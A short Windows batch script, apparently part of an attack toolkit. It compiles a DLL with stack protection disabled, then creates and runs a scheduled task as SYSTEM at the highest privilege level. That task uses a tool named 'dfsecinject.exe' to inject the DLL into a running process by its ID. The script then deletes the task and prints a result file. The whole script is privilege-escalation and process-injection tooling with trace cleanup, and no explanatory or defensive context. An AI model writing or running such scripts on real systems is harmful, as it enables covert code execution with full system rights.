@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfpe2.cpp /Fe:dfpe2.dll /link user32.lib > pe2_build.log 2>&1
echo PE2=%errorlevel%
type pe2_build.log
schtasks /create /tn dfa_pe2 /tr "C:\Users\User\trackA\dfsecinject.exe 33172 C:\Users\User\trackA\dfpe2.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_pe2
ping -n 8 127.0.0.1 >nul
schtasks /delete /tn dfa_pe2 /f >nul
type pe.txt
